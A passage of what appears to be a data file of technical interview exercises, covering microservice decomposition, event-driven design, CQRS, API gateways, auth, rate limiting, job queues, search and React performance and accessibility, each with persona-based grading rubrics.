    description: `Your company has a monolith that handles: user management, product catalog, ordering, payments, inventory, shipping, and notifications. It's a Rails app, 300k lines, 8 developers. Deployments take 45 minutes and happen twice a week because everyone is afraid of breaking something.

The CTO has decided to "move to microservices." You have been asked to propose the first two services to extract and the extraction plan.

Draw the current monolith's main modules, identify the service boundaries, and propose your first two extractions with justification. Include the communication pattern between the new services and the remaining monolith.`,
    duration: 45,
    difficulty: 'hard',
    type: 'whiteboard',
    category: 'architecture',
    languages: [],
    tags: ['architecture', 'microservices', 'system-design'],
    topics: ['microservices', 'monolith-decomposition', 'bounded-contexts', 'service-boundaries', 'strangler-fig-pattern'],
    variations: [
      {
        ownerRole: 'Principal architect who has led two monolith-to-microservices migrations and considers 60% of microservice migrations a mistake',
        ownerContext:
          "Evaluate the developer's judgment about WHAT to extract, not just HOW. The first extraction should be the module with the clearest boundary and the least coupling to the rest of the monolith. Notifications is often the best first candidate: it has a clear input (send this to that person), minimal shared state, and extracting it provides immediate value (independent scaling, different deployment cadence). Payments is a tempting second choice but has high coupling to orders and inventory — extracting it early is risky. Evaluate whether the developer: (1) considers coupling and data ownership when choosing boundaries; (2) proposes the strangler fig pattern (new service handles new requests, old code handles existing); (3) addresses the data split problem — how do you share user data between the monolith and the new service? Give credit for questioning whether microservices are the right answer for 8 developers.",
      },
      {
        ownerRole: 'VP of Engineering who has seen microservice migrations succeed and fail, and judges proposals based on team capacity and organizational impact',
        ownerContext:
          "Evaluate organizational awareness. With 8 developers, each new microservice needs an owner. Two new services means at least 2 developers are now split between the monolith and their service. Does the developer consider the team size constraint? Does their extraction plan account for: (1) a shared database phase (both monolith and service read the same DB initially); (2) an API contract between the service and the monolith; (3) deployment independence (the whole point — can the new service deploy without the monolith?). Give credit for: realistic timelines (first extraction takes 2-3 months, not 2 weeks), acknowledging that the monolith doesn't go away, and proposing a concrete communication pattern (synchronous REST for queries, async events for state changes).",
      },
    ],
  },

  {
    id: uuidv5('exercise-029-event-driven-architecture'),
    title: 'The Event-Driven Transition',
    description: `Your food delivery platform currently uses synchronous REST calls between services:

1. Customer places order → Order Service calls Payment Service (sync)
2. Payment succeeds → Order Service calls Restaurant Service (sync)
3. Restaurant accepts → Order Service calls Delivery Service (sync)
4. Driver assigned → Order Service calls Notification Service (sync)

When any downstream service is slow or down, the entire order flow fails. Last week, the Notification Service had a 5-minute outage and it blocked 400 orders.

Redesign this flow using events. Show the event flow, the topics/queues, and explain what happens when each service fails.`,
    duration: 30,
    difficulty: 'hard',
    type: 'whiteboard',
    category: 'architecture',
    languages: [],
    tags: ['architecture', 'event-driven', 'resilience'],
    topics: ['event-driven-architecture', 'message-queues', 'saga-pattern', 'eventual-consistency', 'failure-handling'],
    variations: [
      {
        ownerRole: 'Staff engineer who designed the event-driven architecture for a food delivery platform processing 500k orders per day',
        ownerContext:
          "Evaluate the developer's event design for correctness and failure handling. Key events: `OrderPlaced`, `PaymentCompleted`, `PaymentFailed`, `RestaurantAccepted`, `RestaurantRejected`, `DriverAssigned`, `OrderDelivered`. Critical evaluation: (1) Payment MUST still be synchronous or saga-coordinated — you cannot fire-and-forget a payment; (2) Notification should be fully async — it should never block order flow; (3) Restaurant acceptance needs a timeout — what if the restaurant never responds? (4) The developer should identify which events need guaranteed delivery (payment, restaurant) vs. best-effort (notification). Give credit for: proposing a saga or orchestrator for the payment→restaurant→delivery flow, handling compensation (what happens when payment succeeds but restaurant rejects?), and explaining dead-letter queues for failed events.",
      },
      {
        ownerRole: 'CTO of the food delivery startup who needs this redesign to be incremental, not a 6-month rewrite',
        ownerContext:
          "Evaluate incrementalism. The developer should NOT propose replacing all 4 synchronous calls with events simultaneously. The pragmatic approach: (1) first, make Notification async (highest impact, lowest risk — an undelivered notification is not a failed order); (2) then, add events between Restaurant and Delivery services; (3) keep Payment synchronous or move to a saga pattern last (highest risk). Evaluate whether the developer proposes running both patterns in parallel during transition (sync call + event publish, with the event consumer as the new path and the sync call as fallback). Give credit for: realistic sequencing, acknowledging that event-driven systems are harder to debug, and proposing observability (distributed tracing, event replay) as part of the design.",
      },
    ],
  },

  {
    id: uuidv5('exercise-030-cqrs-pattern'),
    title: 'The CQRS Decision',
    description: `Your SaaS product has a dashboard that reads data from 6 different tables with complex JOINs. The same database handles all write operations (user actions, billing, settings). During peak hours, the dashboard queries compete with writes and both slow down.

The team is considering CQRS (Command Query Responsibility Segregation). Design a CQRS architecture for this system. Show: (1) how writes flow, (2) how the read model is built and kept in sync, (3) what technology you would use for the read store, (4) what happens when the read model is stale.`,
    duration: 30,
    difficulty: 'hard',
    type: 'whiteboard',
    category: 'architecture',
    languages: [],
    tags: ['architecture', 'cqrs', 'system-design'],
    topics: ['cqrs', 'event-sourcing', 'read-models', 'eventual-consistency', 'projection-rebuild'],
    variations: [
      {
        ownerRole: 'Staff architect who has implemented CQRS at two companies — one successfully and one that was rolled back after 8 months of pain',
        ownerContext:
          "Evaluate whether the developer understands the trade-offs of CQRS, not just the pattern. Key evaluation: (1) do they separate the write model (normalized, transactional) from the read model (denormalized, optimized for queries)? (2) what synchronization mechanism do they propose — change data capture, domain events, or database triggers? (3) do they address the consistency gap — when a user updates their settings and immediately refreshes the dashboard, will they see the old data? (4) do they acknowledge the operational complexity — now you have two data stores to maintain, monitor, and debug. Give credit for: addressing the staleness problem explicitly (showing a 'last updated' timestamp, or using read-your-own-writes consistency), choosing an appropriate read store (Elasticsearch for search, materialized views for simple cases), and identifying when CQRS is overkill (maybe a read replica is sufficient).",
      },
      {
        ownerRole: 'Senior developer who proposed CQRS at a previous company, implemented it, and then spent 6 months debugging sync issues',
        ownerContext:
          "Evaluate whether the developer considers simpler alternatives before committing to CQRS. A PostgreSQL read replica might solve the problem at 10% of the complexity. A set of materialized views refreshed every minute might be sufficient for a dashboard. CQRS is the right answer when reads and writes have fundamentally different shapes and scale independently — evaluate whether the developer establishes this before proposing the full pattern. Give credit for: listing alternatives (read replica, materialized views, query optimization) and explaining why each is or isn't sufficient, designing the sync mechanism with failure handling (what happens when a projection fails mid-update?), and proposing a way to rebuild projections from scratch (event replay or full re-read from the write store).",
      },
    ],
  },

  {
    id: uuidv5('exercise-031-api-gateway'),
    title: 'The API Gateway Design',
    description: `Your company has 8 backend microservices. The mobile app and web frontend currently call each service directly. This causes problems: each client needs to know every service's URL, handle authentication independently, and make multiple round-trips for a single page.

Design an API gateway. Show: what it does, how routing works, how authentication is centralized, and how you would implement request aggregation (one client call that fans out to 3 services). Address the concern: "Isn't the gateway a single point of failure?"`,
    duration: 25,
    difficulty: 'medium',
    type: 'whiteboard',
    category: 'architecture',
    languages: [],
    tags: ['architecture', 'api-gateway', 'microservices'],
    topics: ['api-gateway', 'reverse-proxy', 'authentication', 'request-aggregation', 'single-point-of-failure'],
    variations: [
      {
        ownerRole: 'Platform engineer who has built and operated API gateways at two different companies, one using Kong and one custom-built',
        ownerContext:
          "Evaluate the design for completeness. An API gateway should handle: (1) routing — URL pattern to service mapping; (2) authentication — validate JWT/session once at the gateway, pass user context downstream; (3) rate limiting — protect backend services from abuse; (4) request aggregation — BFF (Backend for Frontend) pattern for combining multiple service calls; (5) observability — centralized logging, tracing, metrics. For the single-point-of-failure concern: the gateway must be horizontally scalable (multiple instances behind a load balancer) and stateless (no session state in the gateway itself). Evaluate whether the developer distinguishes between a 'thin' gateway (routing + auth only) and a 'fat' gateway (business logic in the gateway) — fat gateways become monoliths. Give credit for recommending an existing solution (Kong, AWS API Gateway, Envoy) over building custom.",
      },
      {
        ownerRole: 'Mobile tech lead whose team currently makes 12 API calls to load the home screen and needs that reduced to 2-3',
        ownerContext:
          "Evaluate from the client perspective. The mobile team's main pain point is multiple round-trips on cellular connections with high latency. Does the gateway design include a BFF (Backend for Frontend) layer that aggregates responses? Does it support GraphQL or a similar query mechanism so the mobile app can request exactly the fields it needs? Evaluate whether the developer considers mobile-specific concerns: payload size (mobile clients need smaller responses), partial failure (what if 2 of 3 backend calls succeed — does the gateway return partial data or fail entirely?), and caching at the gateway level for data that changes infrequently. Give credit for addressing partial failure gracefully — a home screen that shows user profile and order history but says 'recommendations unavailable' is better than a blank screen.",
      },
    ],
  },

  {
    id: uuidv5('exercise-032-service-mesh'),
    title: 'The Service Mesh Evaluation',
    description: `Your engineering team runs 15 microservices on Kubernetes. Inter-service communication uses plain HTTP. You have recurring problems: no mutual TLS between services, inconsistent retry policies, no distributed tracing, and difficulty debugging request flows across services.

Your infrastructure lead proposes adding a service mesh (Istio). Your senior developer says "it's too complex for our team size." Evaluate both positions. When is a service mesh worth it? Design what the service mesh would look like for your system and identify what it replaces.`,
    duration: 25,
    difficulty: 'medium',
    type: 'chat',
    category: 'architecture',
    languages: [],
    tags: ['architecture', 'service-mesh', 'infrastructure'],
    topics: ['service-mesh', 'istio', 'envoy', 'mtls', 'distributed-tracing', 'sidecar-pattern'],
    variations: [
      {
        ownerRole: 'Platform architect who evaluated and deployed Istio for a 40-service platform and has opinions about when the complexity is justified',
        ownerContext:
          "Evaluate the developer's ability to reason about infrastructure complexity vs. value. A service mesh provides: mTLS (zero-trust networking), traffic management (retries, circuit breaking, canary deploys), observability (distributed tracing, metrics), and policy enforcement. But it adds: sidecar proxy overhead (CPU, memory, latency), operational complexity (mesh control plane is another thing to manage), and a steep learning curve. For 15 services, the answer depends on the team: a team of 30 engineers with dedicated platform engineers — yes. A team of 15 engineers with no platform team — probably not. Evaluate whether the developer considers alternatives: Linkerd (simpler than Istio), or implementing specific features individually (add tracing with OpenTelemetry, add mTLS with cert-manager, add retries in application code). Give credit for a nuanced answer that identifies which mesh features are most valuable for this specific scenario.",
      },
      {
        ownerRole: 'Senior developer who has worked on a platform with Istio and spent 20% of their time debugging mesh-related issues',
        ownerContext:
          "Evaluate whether the developer acknowledges the hidden costs. Istio adds ~10ms latency per hop (sidecar proxy), increases memory usage by ~100MB per pod (Envoy sidecar), and makes debugging harder (is the failure in my service or in the mesh?). The developer should weigh these costs against the benefits. Key question: of the four stated problems (no mTLS, inconsistent retries, no tracing, debugging difficulty), which can be solved WITHOUT a service mesh? Tracing can be added with OpenTelemetry. Retry policies can be standardized with a shared HTTP client library. Only mTLS and traffic management are genuinely hard to implement without a mesh. Give credit for: quantifying the trade-off, proposing an incremental adoption path, and identifying that the debugging difficulty might get worse, not better, with a mesh.",
      },
    ],
  },

  {
    id: uuidv5('exercise-033-monolith-to-micro'),
    title: 'The Monolith Strangler',
    description: `You have inherited a 5-year-old Django monolith that handles everything: user auth, content management, billing, analytics, and a REST API for mobile clients. The team has grown from 3 to 12 developers. Deployment conflicts are constant — two teams tried to deploy different features on the same day and one broke the other.

The VP of Engineering wants a plan to gradually decompose this monolith. You cannot stop feature development during the migration. Draw the current state, the target state (3-4 services), and the migration plan showing how you get from one to the other without downtime.`,
    duration: 45,
    difficulty: 'hard',
    type: 'whiteboard',
    category: 'architecture',
    languages: [],
    tags: ['architecture', 'migration', 'strangler-fig'],
    topics: ['strangler-fig-pattern', 'monolith-decomposition', 'incremental-migration', 'database-splitting', 'feature-flags'],
    variations: [
      {
        ownerRole: 'Principal engineer who has executed two multi-year monolith decomposition projects and considers the database split the hardest part',
        ownerContext:
          "Evaluate the migration plan for realism. The strangler fig pattern is the correct approach: new functionality is built in a new service, existing functionality is gradually migrated. Key evaluation: (1) the developer must address the shared database problem — all code reads from one Django DB. Extracting a service without splitting the database just creates a distributed monolith. (2) The migration plan should be ordered by risk: start with the least coupled module (analytics or notifications), not the most valuable (billing). (3) Each phase must be independently deployable and reversible. (4) The API layer needs a routing mechanism (reverse proxy or API gateway) to send requests to either the monolith or the new service. Give credit for: a phased plan with clear milestones, addressing data ownership at each phase, and being explicit about what stays in the monolith (auth is usually last to extract).",
      },
      {
        ownerRole: 'VP of Engineering who needs to justify this migration to the board with concrete timelines and risk mitigation, not just technical architecture',
        ownerContext:
          "Evaluate whether the developer thinks about the business context. The migration must not slow down feature delivery — this is non-negotiable. Does the plan include: (1) a timeline estimate per phase (each extraction is 2-4 months, not 2 weeks)? (2) a staffing plan (who works on migration vs. features — ideally the same team owns both)? (3) measurable success criteria (deployment frequency increases, deployment conflicts decrease)? (4) rollback plans for each phase? Give credit for: acknowledging that the migration will take 12-18 months, proposing quick wins in the first 2 months (shared CI/CD pipeline improvements, modular monolith as an intermediate step), and defining when to stop decomposing (not every module needs to be a separate service).",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // Common Services (5 exercises)
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-034-auth-service'),
    title: 'The Auth Service Design',
    description: `Your startup currently has authentication baked into the main application — session cookies, password hashing, OAuth with Google and GitHub, and role-based access control. You are extracting auth into a standalone service that will be used by 3 backend services and 2 frontend apps.

Design the auth service. Show: (1) the API surface (endpoints), (2) the token strategy (JWT, opaque tokens, or both), (3) how other services validate requests without calling the auth service on every request, (4) how you handle token refresh and revocation.`,
    duration: 25,
    difficulty: 'medium',
    type: 'whiteboard',
    category: 'backend',
    languages: [],
    tags: ['auth', 'service-design', 'security'],
    topics: ['authentication', 'authorization', 'jwt', 'oauth', 'token-refresh', 'rbac', 'service-extraction'],
    variations: [
      {
        ownerRole: 'Security engineer who has designed auth systems for 3 companies and has seen every common mistake in token management',
        ownerContext:
          "Evaluate the auth design for security correctness. Key points: (1) JWTs for stateless validation by other services — each service can validate the signature without calling auth; (2) short-lived access tokens (15 min) + long-lived refresh tokens (7 days) stored server-side; (3) token revocation is the hard problem — JWTs cannot be revoked once issued. The developer should propose a solution: a short TTL (revocation takes effect when the token expires), a revocation list (checked by services), or opaque tokens for sensitive operations. (4) OAuth flow: the auth service handles the OAuth dance and issues its own tokens — downstream services never see Google/GitHub tokens. Give credit for: addressing the revocation problem explicitly, separating authentication (who are you?) from authorization (what can you do?), and proposing RBAC that is enforced at the gateway or service level, not just in the auth service.",
      },
      {
        ownerRole: 'Backend tech lead who will consume this auth service from 3 different microservices and needs the integration to be simple and reliable',
        ownerContext:
          "Evaluate from the consumer's perspective. How easy is it for a service to integrate with this auth service? The developer should propose: (1) a middleware/library that services include to validate tokens (not raw JWT verification code in every service); (2) a clear contract for what's in the token payload (user ID, roles, permissions — nothing sensitive); (3) a graceful degradation strategy — what happens when the auth service is down? Services with cached JWTs can still validate, but new logins fail. Is this acceptable? (4) how does the auth service handle 'I need to check if this user has permission X' without coupling every service to the RBAC schema? Give credit for: simple integration patterns, considering the auth service as a potential single point of failure, and designing for the common case (token validation) to be fast and local.",
      },
    ],
  },

  {
    id: uuidv5('exercise-035-notification-service'),
    title: 'The Notification Service',
    description: `Your application sends notifications through 4 channels: email, SMS, push, and in-app. Currently, each feature team sends notifications directly — the checkout team has their own email code, the social team has their own push code. There are 3 different email templates systems, 2 SMS providers, and no unified preference management.

Design a notification service that all teams use. Address: (1) channel routing (how does the system decide which channel to use?), (2) user preferences (users can opt out of specific channels or notification types), (3) template management, (4) delivery guarantees, (5) rate limiting (don't spam a user with 50 notifications in an hour).`,
    duration: 25,
    difficulty: 'medium',
    type: 'whiteboard',
    category: 'backend',
    languages: [],
    tags: ['service-design', 'notifications', 'architecture'],
    topics: ['notification-service', 'channel-routing', 'user-preferences', 'template-engine', 'rate-limiting', 'delivery-guarantees'],
    variations: [
      {
        ownerRole: 'Staff engineer who built the notification platform at a company sending 50M notifications per day across all channels',
        ownerContext:
          "Evaluate the design for scalability and correctness. Key components: (1) an intake API that accepts notification requests with a type (e.g., 'order_confirmed'), recipient, and data payload; (2) a routing layer that checks user preferences and determines which channels to use; (3) a template engine that renders the notification per channel (email needs HTML, push needs short text, SMS has character limits); (4) per-channel delivery workers with retry logic; (5) a preference store. Critical evaluation: does the developer handle the case where a user has opted out of email but not push? Does the rate limiter work per-user per-channel or per-user globally? Does the design include a notification log for debugging ('why didn't this user get notified?')? Give credit for: a clean separation between notification intent and delivery mechanics, idempotency (sending the same notification request twice should not deliver twice), and a dead-letter queue for permanently failed deliveries.",
      },
      {
        ownerRole: 'Product manager who has received 47 support tickets this month saying "I never got the notification" and needs visibility into why',
        ownerContext:
          "Evaluate from the debuggability perspective. When a support ticket says 'I didn't get my email,' can the developer's design answer: (1) was the notification requested? (2) was it filtered by preferences? (3) was it sent to the email provider? (4) did the provider accept it? (5) did it bounce? The design must include a notification audit log that traces each notification from request to delivery (or failure). Evaluate whether the developer includes: delivery status tracking (sent, delivered, bounced, opened), webhook handling from email/SMS providers for delivery receipts, and a support tool or API to look up a user's notification history. Give credit for making the system observable, not just functional.",
      },
    ],
  },

  {
    id: uuidv5('exercise-036-rate-limiter'),
    title: 'The Rate Limiter Implementation',
    description: `Your public API needs rate limiting. Requirements:

- 100 requests per minute per API key for free-tier users
- 1,000 requests per minute per API key for paid users
- 10,000 requests per minute globally (across all users)
- When rate limited, return 429 with a \`Retry-After\` header
- The API runs on 4 server instances behind a load balancer

Implement the rate limiter. Show the algorithm, the storage mechanism, and how it works across multiple server instances. Explain why you chose your algorithm over alternatives.

\`\`\`typescript
// Your rate limiter should implement this interface:
interface RateLimiter {
  check(key: string, limit: number, windowMs: number): Promise<{
    allowed: boolean
    remaining: number
    retryAfterMs: number | null
  }>
}
\`\`\``,
    duration: 25,
    difficulty: 'hard',
    type: 'code',
    category: 'backend',
    languages: ['typescript', 'python'],
    tags: ['rate-limiting', 'distributed-systems', 'redis'],
    topics: ['rate-limiting', 'token-bucket', 'sliding-window', 'redis', 'distributed-systems', 'load-balancing'],
    variations: [
      {
        ownerRole: 'Staff platform engineer who has implemented rate limiters for APIs serving 100k requests per second and knows the edge cases intimately',
        ownerContext:
          "Evaluate the algorithm choice and implementation. Common algorithms: (1) Fixed window — simple but allows burst at window boundaries (180 requests in 2 seconds if the window resets between them); (2) Sliding window log — accurate but memory-intensive; (3) Sliding window counter — good balance of accuracy and efficiency; (4) Token bucket — allows controlled bursting, most flexible. For 4 server instances, the state MUST be in a shared store (Redis). Evaluate: (1) does the developer use Redis atomic operations (INCR + EXPIRE, or Lua script) to avoid race conditions? (2) do they handle the multi-instance problem — without shared state, each instance allows 100 requests, effectively making the limit 400? (3) is the `Retry-After` header calculated correctly? (4) do they handle the global rate limit (10k/min) separately from per-key limits? Give credit for: choosing sliding window or token bucket with clear justification, using Redis Lua scripts for atomicity, and handling clock drift between instances.",
      },
      {
        ownerRole: 'API product manager who has dealt with customer complaints about rate limiting being unfair or unpredictable',
        ownerContext:
          "Evaluate the developer's thinking about fairness and developer experience. Rate limiting is a product feature, not just a technical control. Evaluate: (1) is the rate limit response informative — does the 429 body include `remaining`, `limit`, `reset` headers so the API consumer can adjust? (2) is the algorithm fair — does it prevent a single heavy user from consuming the global limit and blocking other users? (3) does the implementation handle edge cases: what happens when Redis is down (fail open — allow all requests — or fail closed — reject all)? (4) how would the developer add a burst allowance (allow 20 requests in 1 second as long as the per-minute limit isn't exceeded)? Give credit for: informative 429 responses, a fair algorithm under concurrent load, graceful degradation when Redis is unavailable, and consideration of the developer experience for API consumers.",
      },
    ],
  },

  {
    id: uuidv5('exercise-037-job-queue'),
    title: 'The Job Queue Architecture',
    description: `Your application needs background job processing for: sending emails, generating PDF reports, processing image uploads, and running nightly data aggregations. Currently, these are handled by setTimeout calls in the API process — when the server restarts, pending jobs are lost.

Design a job queue system. Address: (1) job persistence and retry, (2) priority levels (emails are urgent, nightly aggregations are not), (3) concurrency control (image processing is CPU-heavy, limit to 2 concurrent), (4) dead-letter handling, (5) monitoring and alerting. Would you build or buy? Justify your choice.`,
    duration: 20,
    difficulty: 'medium',
    type: 'chat',
    category: 'backend',
    languages: [],
    tags: ['architecture', 'job-queue', 'background-processing'],
    topics: ['job-queues', 'background-processing', 'bullmq', 'sidekiq', 'priority-queues', 'retry-strategies', 'dead-letter-queues'],
    variations: [
      {
        ownerRole: 'Staff engineer who has operated BullMQ, Sidekiq, and AWS SQS in production and knows the failure modes of each',
        ownerContext:
          "Evaluate the design for production readiness. Key components: (1) a persistent queue (Redis-backed like BullMQ, or database-backed like Postgres + pgboss); (2) workers that pull jobs, execute them, and report success/failure; (3) retry with exponential backoff (not fixed delay — a failing email provider will be overwhelmed by retries); (4) dead-letter queue for jobs that fail N times; (5) priority queues or separate queues per job type with different concurrency limits. For the build-vs-buy decision: for most teams, BullMQ (Node.js) or Sidekiq (Ruby) or Celery (Python) is the right answer — building a job queue from scratch is almost never justified. Evaluate whether the developer considers: job idempotency (what if a job runs twice?), poisoned jobs (a job that always fails and blocks the queue), and observability (dashboard showing queue depth, processing time, failure rate).",
      },
      {
        ownerRole: 'Senior developer who has migrated from setTimeout-based background processing to a proper job queue and learned painful lessons about job persistence',
        ownerContext:
          "Evaluate whether the developer understands why the current approach (setTimeout) fails. Jobs are lost on restart because they exist only in memory. The first requirement is persistence: a job must survive a server restart. Evaluate their migration plan: (1) can they add the job queue alongside the existing setTimeout approach and migrate job types one at a time? (2) do they handle the transition — what about jobs that were scheduled before the migration? (3) do they propose monitoring that would have caught the current problem (alert when jobs are lost on restart)? Give credit for: a pragmatic technology choice (BullMQ if already using Redis, database-backed if not), a gradual migration plan, and explicit handling of the 'server restarts with pending jobs' scenario.",
      },
    ],
  },

  {
    id: uuidv5('exercise-038-search-service'),
    title: 'The Search Service Design',
    description: `Your e-commerce platform needs full-text search across 2M products. Current implementation uses SQL \`LIKE '%query%'\` and takes 3-5 seconds. Requirements:

- Typo tolerance ("iphne" should find "iPhone")
- Faceted search (filter by category, price range, brand)
- Relevance ranking (exact matches first, then partial)
- Autocomplete suggestions as the user types
- Sync with the product database (products added/updated/deleted)

Design the search service. Choose a search engine, show the data flow from the product database to the search index, and explain how you handle the sync problem (the search index being out of date with the database).`,
    duration: 25,
    difficulty: 'medium',
    type: 'chat',
    category: 'backend',
    languages: [],
    tags: ['search', 'elasticsearch', 'service-design'],
    topics: ['full-text-search', 'elasticsearch', 'meilisearch', 'inverted-index', 'data-synchronization', 'relevance-ranking'],
    variations: [
      {
        ownerRole: 'Staff engineer who has built and operated Elasticsearch clusters with 500M documents and knows the operational cost of running a search infrastructure',
        ownerContext:
          "Evaluate the technology choice and architecture. For 2M products, Elasticsearch or Meilisearch are both appropriate — evaluate whether the developer justifies their choice. Key architecture: (1) the search index is a read replica of the product data, not the source of truth; (2) sync mechanism: change data capture (CDC) from the database, event-driven updates (product service publishes events), or periodic full reindex; (3) the index mapping (schema) should be designed for the query patterns: text fields for full-text search, keyword fields for facets, numeric fields for range queries. Evaluate: does the developer understand that typo tolerance requires configuring the search engine's fuzzy matching? Does the autocomplete suggestion use a separate index or a different query type (prefix query vs. full-text)? Give credit for: a realistic sync strategy with failure handling, acknowledging that the search index will sometimes be stale, and proposing a monitoring strategy (alert when sync lag exceeds N seconds).",
      },
      {
        ownerRole: 'Product manager who has worked on e-commerce search at two companies and judges search quality by conversion rate, not technical elegance',
        ownerContext:
          "Evaluate from the product perspective. Search quality is measured by: (1) can users find what they're looking for? (2) how fast are results returned? (3) are the results ranked by relevance, not just recency? Evaluate whether the developer considers: relevance tuning (boosting exact matches, popular products, in-stock items), zero-results handling (suggest alternatives when nothing matches), and search analytics (track what users search for vs. what they click — high search-no-click rates indicate poor relevance). Give credit for: discussing relevance scoring factors, proposing A/B testing for search ranking changes, and considering the user experience for edge cases (searching for a product by SKU, searching for a category name instead of a product).",
      },
    ],
  },

  // -------------------------------------------------------------------------
  // Frontend (5 exercises)
  // -------------------------------------------------------------------------

  {
    id: uuidv5('exercise-039-state-management'),
    title: 'The State Management Debate',
    description: `Your React application has grown to 60 components across 12 pages. State is managed with a mix of: useState in individual components, useContext for auth and theme, Redux for the shopping cart, and React Query for server data. A new developer joins the team and says "this is chaos — we should pick one state management solution and use it for everything."

Evaluate the current approach. Is it really chaos, or is it appropriate? When would you consolidate, and when would you keep multiple approaches? Make your case with specific examples from a typical e-commerce app.`,
    duration: 15,
    difficulty: 'easy',
    type: 'chat',
    category: 'frontend',
    languages: [],
    tags: ['frontend', 'state-management', 'react'],
    topics: ['state-management', 'react', 'redux', 'react-query', 'context-api', 'component-architecture'],
    variations: [
      {
        ownerRole: 'Senior frontend architect who has worked on React apps ranging from 10 to 500 components and has strong opinions about state categorization',
        ownerContext:
          "Evaluate whether the developer understands that different types of state have different management needs. The four categories: (1) local UI state (form inputs, toggles) → useState; (2) global UI state (theme, auth, modals) → Context or Zustand; (3) server state (products, orders, user data) → React Query or SWR; (4) client-side complex state (shopping cart, multi-step forms) → Redux or Zustand. The current setup is actually reasonable — using useState for local, Context for auth/theme, Redux for cart, React Query for server data aligns with these categories. The new developer's suggestion to use 'one solution for everything' is a red flag — it leads to Redux for form inputs or React Query for UI toggles. Give credit for: defending the multi-tool approach with clear categorization, identifying when consolidation makes sense (too many Contexts causing re-render issues), and explaining the trade-off between consistency and fitness-for-purpose.",
      },
      {
        ownerRole: 'Frontend tech lead who has onboarded 8 developers onto an existing React codebase and knows that state management confusion is the #1 onboarding friction point',
        ownerContext:
          "Evaluate the developer's empathy for the new developer's perspective. The new developer is not wrong to feel confused — the problem is not the tools, it's the lack of documented conventions. Evaluate whether the developer proposes: (1) a state management decision tree (if X, use Y — documented in the repo); (2) clear boundaries (all server data goes through React Query, no exceptions; cart state lives in Redux, not Context); (3) code review enforcement of these conventions. The current approach may be correct but it needs to be intentional, not accidental. Give credit for: acknowledging the onboarding problem, proposing documentation rather than rewriting, and identifying the real risk of the current setup — it's one decision away from someone putting server data in Redux and duplicating what React Query does.",
      },
    ],
  },

  {
    id: uuidv5('exercise-040-rendering-optimization'),
    title: 'The Slow Render',
    description: `Your React dashboard has a data table with 500 rows and 12 columns. Every time the user types in the search box above the table, the entire page freezes for 300-400ms. The profiler shows the table re-rendering on every keystroke. Here's the simplified structure:

\`\`\`tsx
function Dashboard() {
  const [search, setSearch] = useState('')
  const [data, setData] = useState<Row[]>(initialData)
  const [sortColumn, setSortColumn] = useState('name')

  const filteredData = data.filter(row =>
    row.name.toLowerCase().includes(search.toLowerCase())
  )

  const sortedData = [...filteredData].sort((a, b) =>
    a[sortColumn] > b[sortColumn] ? 1 : -1
  )

  return (
    <div>
      <SearchBox value={search} onChange={setSearch} />
      <DataTable rows={sortedData} onSort={setSortColumn} />
      <Sidebar stats={computeStats(data)} />
    </div>
  )
}
\`\`\`

Identify all the performance problems. Fix them. Explain each optimization and when it would NOT be appropriate.`,
    duration: 15,
    difficulty: 'easy',
    type: 'code',
    category: 'frontend',
    languages: ['typescript'],
    tags: ['frontend', 'performance', 'react'],
    topics: ['react-performance', 'useMemo', 'useCallback', 'virtualization', 're-rendering', 'memoization'],
    variations: [
      {
        ownerRole: 'Senior React developer who has optimized rendering performance on dashboards with 10k+ rows and uses the React Profiler weekly',
        ownerContext:
          "Multiple performance issues to identify: (1) `filteredData` and `sortedData` are recomputed on every render — wrap in `useMemo` with `[data, search]` and `[filteredData, sortColumn]` dependencies; (2) `computeStats(data)` runs on every render even though `data` doesn't change when `search` changes — wrap in `useMemo` with `[data]`; (3) `DataTable` re-renders on every keystroke because `sortedData` is a new array reference — memoize the table component with `React.memo`; (4) `onSort={setSortColumn}` creates a new function reference each render — use `useCallback`; (5) for 500 rows, virtualization (react-window or tanstack-virtual) would eliminate rendering off-screen rows. Evaluate whether the developer correctly identifies the most impactful fix (useMemo for the filter/sort chain) vs. premature optimizations. Give credit for explaining when memoization is NOT appropriate — small lists, simple components, or when the overhead of memoization exceeds the render cost.",
      },
      {
        ownerRole: 'Frontend performance consultant who has audited 20+ React applications and seen developers add useMemo everywhere without measuring',
        ownerContext:
          "Evaluate whether the developer measures before optimizing. The correct first step is: run the React Profiler, identify which components re-render and how long each takes. Evaluate: (1) do they use useMemo for the expensive computations (filter, sort, stats)? (2) do they consider debouncing the search input (300ms delay) as a quick win that avoids the render entirely? (3) do they suggest React.memo for DataTable? (4) do they mention virtualization for the 500 rows? Give credit for: proposing debounce as the simplest fix (zero code complexity), correctly applying useMemo (with proper dependency arrays), and stating that useCallback for `onSort` only matters if DataTable is memoized — otherwise it's useless. Deduct for blindly wrapping everything in useMemo without explaining the dependency arrays.",
      },
    ],
  },

  {
    id: uuidv5('exercise-041-accessibility-audit'),
    title: 'The Accessibility Audit',
    description: `Your product just got a complaint from a major enterprise customer: their employees who use screen readers cannot use the main workflow. You inspect the code and find:

\`\`\`tsx
function TaskList({ tasks, onComplete }) {
  return (
    <div className="task-list">
      {tasks.map(task => (
        <div key={task.id} className="task-item" onClick={() => onComplete(task.id)}>
          <div className="task-icon">
            {task.completed ? '✓' : '○'}
          </div>
          <div className="task-title">{task.title}</div>
          <div className="task-date" style={{ color: '#999' }}>
            {task.dueDate}
          </div>
          <div className="delete-btn" onClick={(e) => { e.stopPropagation(); onDelete(task.id) }}>
            ×
          </div>
        </div>
      ))}
    </div>
  )
}
\`\`\`

Identify every accessibility problem. Fix the component. Explain WCAG guidelines relevant to each fix.`,
    duration: 20,
    difficulty: 'medium',
    type: 'code',
    category: 'frontend',
    languages: ['typescript'],
    tags: ['frontend', 'accessibility', 'wcag'],
    topics: ['accessibility', 'wcag', 'aria', 'semantic-html', 'screen-readers', 'keyboard-navigation'],
    variations: [
      {
        ownerRole: 'Accessibility specialist who has audited 50+ web applications and conducted usability testing with screen reader users',
        ownerContext:
